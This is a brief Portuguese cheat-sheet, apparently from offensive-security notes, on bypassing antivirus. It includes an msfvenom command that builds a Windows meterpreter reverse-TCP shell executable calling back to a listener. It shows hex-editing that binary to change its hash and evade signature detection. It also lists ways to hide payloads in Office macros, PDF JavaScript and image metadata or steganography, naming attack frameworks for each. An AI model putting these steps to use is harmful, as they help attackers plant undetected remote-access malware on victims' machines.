# Bypass de antivirus

1. **Escrever seus próprios código.** Isso torna seu payload único, tornando-o mais difícil de ser detectado.
2. **Usar ferramentas novas.** Ferramentas ainda não conhecidas pelos antivirus tem maoir probabilidade de gerar código com baixa detecção.
3. **Modificar o payload gerado.** Uma vez modificado, diminiu ligeramente a possibilidade de ser detectado. exemplo:
  * Gere o payload:
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe`

 $ md5sum shell.exe                       
 fa90bda8a378fa59246eee7f2f35337a  shell.exe
 ```
  * Edite o arquivo, alterando partes modificáveis como textos.<br>
 ```
 $ hexeditor shell.exe
 ```
![Hexeditor]()
 ```
 $ md5sum shell.exe          
 aeaae1490afd16ed1e9ae60a1e6c95ca  shell.exe
 ```
> Observamos que o hash do arquivo mudou, aumentando a possibilidade de não detecção, uma vez que provavelmente não estará na base de dados dos antivirus.

4. Embutir o payload em arquivos de trabalho
  - **Office**, através de código malicioso em **VBA**.
    - Evil clip
  - **PDF**, através de código malicioso em **JavaScript**.
    - Responder, Empire, Cobalt Strike
  - ***Imagens***, através de steganografia, ccódigo malicioso nos **metadados** ou **bits de imagem**.
    - Steghide, ExIfTool

